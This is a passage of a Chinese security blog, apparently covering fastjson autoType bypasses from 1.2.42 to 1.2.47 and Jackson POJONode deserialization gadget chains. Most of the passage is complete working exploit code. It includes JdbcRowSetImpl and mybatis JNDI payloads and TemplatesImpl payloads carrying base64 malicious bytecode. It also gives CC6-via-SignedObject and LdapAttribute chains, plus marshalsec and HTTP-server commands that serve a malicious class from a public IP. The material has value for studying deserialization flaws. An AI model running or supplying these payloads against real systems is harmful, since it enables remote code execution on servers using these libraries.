\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;LLcom.sun.rowset.JdbcRowSetImpl;;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 数组格式没有影响，直接打就行了，只有L格式的使用双写绕过即可。\n简单说说这里的L过程，前面进行黑名单的判断，也是和前面分析的差不多的，就是与变量autoTypeSupport为true或者false，都会进行一次，但是都不在白名单中，所以无法直接加载，最后还是在如下进行加载的： 可以看到这里是传入的形参传递的内容，然后判断是有clazz是否为null，这里看似可以不用再调用ParserConfig.getGlobalInstance().setAutoTypeSupport(true)来进行设置值，前面我们也知道，这里的autoTypeSupport默认为false，后看有一个逻辑我们必须让这个变量为true：\n只有位true才能正常获取到想要的类，不然就会报异常从而退出。\n然后对于TypeUtils.loadClass()方法内的内容： 可以看出来是会调用三次这个loadClass()方法最后才会成功加载到类：\n后面就是熟知的过程了，这不多说。\n1.2.43 依赖改版本，然后直接定位到修改的部分，还是跟进checkAutoType()方法： 里面又套了一个if条件，意思就是如果是以LL开头，那么就直接抛出异常。\n这里的绕过方法就是前面的数组，没错，到这个版本的数组格式还是能打，最后的payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } TemplatesImpl就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } ——————\n1.2.44 同样是在checkAutoType()方法中，如下逻辑：\n前一个if是判断是否以[开头，第二个应该是判断最后是否以;结尾吧，从这里可以看出就是修复了[的payload，过滤了数组形式的payload。\n1.2.45 这个版本还存在一个黑名单绕过，但是其实是一个组件漏洞，这里利用到的是mybatis组建，需要添加依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 注意修改fastjson的版本。\n其实这个漏洞基本看一下payload就懂了，利用了组件，所以算是利用另外的类，在1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45版本只要有这个组件都能打。\nPOC如下：\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;data_source\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;}} 对应类的setter方法有jndi漏洞：\n所以构造了直接打就行了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\u0026#34;,\\\u0026#34;properties\\\u0026#34;:{\\\u0026#34;data_source\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;}}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行弹出计算机，注意还是需要设置autoTypeSupport为true。\n1.2.47 这个算是比较重要的漏洞点了，可以不开始autoTypeSupport触发反序列化漏洞。\n影响版本：1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.47\n这里还是从1.2.47版本来分析。\n还是跟进checkAutoType()方法，其实在这个类不止最后那个需要autoTypeSupport为true才能返回加载到的clazz，如下代码：\n这里的expectClass变量默认为null，那么只要我们能在TypeUtils.getClassFromMapping()或者deserializers.findClass()找到想要利用的类，那么就可以直接在这里返回加载到的类。\n跟进这里的TypeUtils.getClassFromMapping()方法：\n可以看到是从mapping中取值，那么这个mappings是怎么进行处理的呢，重新跟了一遍流程，没看到有赋值的地方，那么肯定就是TypeUtils类的static语句在进行处理，翻看了一下这个类的static语句，可以看到如下内容： 跟进这个addBaseClassMappings()方法，里面加载了很多类（下图只是部分）： 似乎不可控，那么我们再去看deserializers.findClass()获取类的方法：\n可以看到这里想要返回clazz的话有一定条件，并且这里是与IdentityHashMap类的buckets变量有关，然后看这里的条件，需要key为Class属性。那么我们看一下这里deserializers变量的赋值逻辑，这里肯定就是与ParserConfig类有关了，这个也是之前说的形参传递的类变量，具体如下：\n调用的方法： 这次就需要跟进ParserConfig类的构造函数了，他的构造函数调用了initDeserializers()方法，这个方法内部可以看到如下内容：\n里面调用了很多方法，注意图中，是放入了一个Class.class的键，看这个对应的类，之类就是获取到这个类：\n而这个类的deserialze()方法存在一个存在一个利用点：\n这里会调用loadClass()方法，就是我们之前熟知的方法，在这里存在一个利用点： 这里的cache默认是true，所以这里会将对应的className放进mappings，并且这里的参数是可控的，从参数传递来看，这里的className就是前面的strVal变量：\n而setVal变量是由objVal变量转换来的，objVal又是从json字符串解析来的：\n是不是看到这里还有点懵，别急，为什么这里要提到deserialze()方法呢，当我们正常反序列化时，同时其实从前面的调试过程可以知道，是会获取deserializer并调用它的deserialze()方法：\n所以对应的，我们可以先尝试传入Class.class，从而获取到MiscCodec类实例，从而调用到它的deserialze()方法，从而往mappings中放入想要利用的类，从而在直接在后续中获得想要的类，如下：\n所以综上上面的思路，需要调用两次，一次放进指定类，一次加载触发反序列化，可以尝试如下构造：\n1 2 3 4 5 6 7 8 9 10 11 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后弹出计算机，注意是打的jndi打法。\n这里的细节就是没有设置autoTypeSupport，默认为false，那么第一个判断黑名单的就不会进入：\n而第二个判断黑名单的地方不会到达：\n直接在中间就找到直接结束了，所以也是payload中第二个可以那样设置的原因。\nTemplatesImpl的打法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class Fastjson_Test{ public static void main(String[] args) throws Exception { String json = \u0026#34;{\\\u0026#34;1\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;},\\\u0026#34;2\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}}\\n\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 运行后均弹出计算机。\n确实可以。\n参考文章：\nhttps://xz.aliyun.com/news/14309\nhttps://nivi4.notion.site/fastjson-873722f1374b4c4e99cc3283a38dfb37\nhttps://tttang.com/archive/1579/#toc_1244\n","date":"2025-04-15T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"fastjson反序列化"},{"content":"jackson反序列化通杀链 前面简单了解了一下jackson反序列化，可以知道在序列化时会调用getter方法，而反序列化时会调用setter，但是都是有一定限制的，这里就来了解一下原生链的打法。\npom.xml文件中使用的依赖项如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.13.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.13.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.13.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境：\nJDK8u71 前置 这里就先提供一个浅显易懂的反序列化代码，然后来看一下这里的反序列化流程，简单从一个序列化的角度来看一下这里的流程。\n代码定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package jackson; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; import java.lang.Runtime; public class Main { public static void main(String[] args) throws Exception { Hacker hacker = new Hacker(); String ow = new ObjectMapper().writeValueAsString(hacker); System.out.println(ow); } } class Hacker { String name2 = \u0026#34;fupanc2\u0026#34;; public Hacker(){ } public String getName(){ try { Runtime.getRuntime().exec(\u0026#34;open -a Calculator\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } return \u0026#34;fupanc\u0026#34;; } public void setName(String name){ this.name2 = name; } } 这里的代码运行，成功弹出计算机。打断点于writeValueAsString方法行，一直跟进，可以发现是在如下代码处成功调用的invoke()方法从而获取值： 这里的调用栈如下：\n可以自己去跟一下\n——————\nPOJONode链 这个类位于com.fasterxml.jackson.databind.node.POJONode，它的toString链可以触发任意的getter方法。\n前面都说了核心的思想，toString()方法调用任意的getter方法，那么对于getter方法，最经典的就是TemplatesImpl的利用。所以这里的思想还是想着toString链调用到getOutputProperties()方法。现在来跟一下看看怎么实现。\nPOJONode类文件本身是没有实现toString()方法的，具体的实现是在其父类的父类BaseJsonNode类中，代码内容如下：\n1 2 3 public String toString() { return InternalNodeMapper.nodeToString(this); } 这里会调用InternalNodeMapper类的nodeToString()方法：\n1 2 3 4 5 6 7 public static String nodeToString(JsonNode n) { try { return STD_WRITER.writeValueAsString(n); } catch (IOException e) { // should never occur throw new RuntimeException(e); } } writeValueAsString()方法，太经典的jackson序列化调用的方法了，那么这里的漏洞点就是这里。先来看一下这里的STD_WRITER变量的定义，变量定义如下：\n1 2 3 private final static JsonMapper JSON_MAPPER = new JsonMapper(); private final static ObjectWriter STD_WRITER = JSON_MAPPER.writer(); 这里利用的是JsonMapper类，然后这里的STD_WRITER变量的定义是JsonMapper类的writer()方法的返回值，我们可以跟进一下这里的writer()方法的调用，发现这里JsonMapper其实并没有定义writer()方法，还是调用的其父类ObjectMapper类的writer()方法：\n1 2 3 public ObjectWriter writer() { return _newWriter(getSerializationConfig()); } 然后调用了_newWriter()方法：\n1 2 3 protected ObjectWriter _newWriter(SerializationConfig config) { return new ObjectWriter(this, config); } 这里就返回了一个ObjectWriter类实例。并且在后面进行了序列化，在序列化部分是通过调用writeValueAsString()方法来进行序列化的，可以跟进一下，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public String writeValueAsString(Object value) throws JsonProcessingException { // alas, we have to pull the recycler directly here... SegmentedStringWriter sw = new SegmentedStringWriter(_generatorFactory._getBufferRecycler()); try { _writeValueAndClose(createGenerator(sw), value); } catch (JsonProcessingException e) { throw e; } catch (IOException e) { // shouldn\u0026#39;t really happen, but is declared as possibility so: throw JsonMappingException.fromUnexpectedIOE(e); } return sw.getAndClear(); } 然后我发现，ObjectMapper的writeValueAsString()方法代码逻辑同上，也就是说明其实这里就是调用ObjectMapper来进行序列化，也就是和前面了解的差不多了。总的来说，就是这里的ObjectMapper是可以用来同时序列化和反序列化的，但是ObjectWriter只是用来序列化的，同时有一个ObjectReader来进行反序列化：\n所以其实都是差不多的。\n对于触发toString()方法，最经典的就是CC5了。开头已经找到了，那么对于POJONode类之间的构造该是什么呢，来看一下代码之间的联系：\n我们可以知道这里对POJONode类调用toString()方法，其实就是对POJONode类进行一个json序列化，序列化，肯定会调用类的变量，从POJONode类的变量中，我们可以拿到如下内容：\n是的，这个_value变量，并且这个变量的定义为Object，所以是可以利用的。那么这里还是利用TemplatesImpl类的getter方法，但是这里又涉及到了一个问题，也是前面rome链提到了，这里的getter的获取，该怎么定义？\n而TemplatesImpl类有多个getter方法，是否有影响呢？先构造试试看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package jackson; import javax.management.BadAttributeValueExpException; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Object bad = new BadAttributeValueExpException(null); Field field = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 虽然成功弹出计算机，但是代码运行会报错，并且调试可得这里并不是反序列化时弹出的计算机，而是在序列化就弹计算机了。简单跟一下，发现这里是由于BaseJsonNode类定义了writeReplace()方法，而如果序列化的类实现了writeReplace方法，那么将会在序列化过程中调用它进行检查，所以这里会出错，解决方法就是删去这个方法，idea上的源码不能直接删除，还可以重写这个类来调用，还可以通过javassist来在JVM中动态更改这个类的方法，最好是修改它的方法名，一劳永逸，最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package jackson; import javax.management.BadAttributeValueExpException; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctMethod.setName(\u0026#34;reset\u0026#34;); //也可以直接删去这个类 //ctClass.removeMethod(ctMethod); //加载修改后的类 ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); //BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Object bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 至于原先错误代码中为什么在序列化之前就会弹出计算机，可以自己去调调。\nSignedObject链 其实就是套了一个二次反序列化链，这里本来就是可以调用getter方法，那么二次反序列化就逃不脱了。\n不多赘述，这里还是二次反序列化一个CC6，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package jackson; import javax.management.BadAttributeValueExpException; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.security.KeyPairGenerator; import java.security.KeyPair; import java.lang.reflect.Field; import java.security.Signature; import java.security.SignedObject; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap,kp.getPrivate(),Signature.getInstance(\u0026#34;DSA\u0026#34;)); POJONode node = new POJONode(signedObject); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } ————————\nLdapAttribute链 这个类位于com.sun.jndi.ldap.LdapAttribute，这是一个default属性的类，不能直接导入，反射获取即可，这个类有getter方法可以进行jndi注入：\n这里就从payload来学习一下这个的使用方法(有小tips，具体看后面怎么打)，先说打法，再简单讲讲这里的过程，这里需要用到marshalsec工具，然后在自己的服务器上运行jar包来生成服务器：\n1 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://47.100.223.173:2333/#a\u0026#34; 1389 然后开一个python的http服务：\n1 python3 -m http.server 2333 注意在python的http服务的当前目录下放弹计算机的class文件，这里就不多说了。\n然后运行下面这个代码即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javax.management.BadAttributeValueExpException; import javax.naming.CompositeName; import java.io.*; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main( String[] args ) throws Exception { //删去影响POJONode序列化的类 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.get(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctClass.removeMethod(ctMethod); ctClass.toClass(); String ldapCtxUrl = \u0026#34;ldap://47.100.223.173:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(String.class); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(\u0026#34;fupanc\u0026#34;); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); POJONode jsonNodes = new POJONode(ldapAttribute); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;).getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(exp,jsonNodes); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); oos.writeObject(exp); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ois.readObject(); ois.close(); } } 这样就可以在反序列化时弹出计算机。\n分析过程就简单说说吧，详细的可以去网上找文章看：\n上面主要的一个不同点就在于ldap的url没有写成ldap://xxxx/xxx，也就是后面没有加请求的codebase那些了，这里是因为payload中会的a//b会在请求时会自动加上一个a，如：\n这个主要是由payload造成的，这里也就不多说了。所以这里需要用到marshalsec工具，个人理解就是直接返回一个路径让其访问拿class文件，不管是发送什么的请求，所以其实直接将a.class改成MyTest.class也是可以的。\n最后其实调试后可以发现成功打jndi注入是在getSchema()方法中，有兴趣的可以再调试跟一下这里的反序列化过程。\n其他触发toString的类 这里的知识点其实更多的算是一种绕过，在前面链子的学习中，我们调用toString()方法，都是利用的BadAttributeValueExpException来进行toString()方法的调用，但是如果这个类被band掉了呢，又该怎么利用，下面就来学习一下另外的可以调用toString()方法的类。\nXStringForFSB 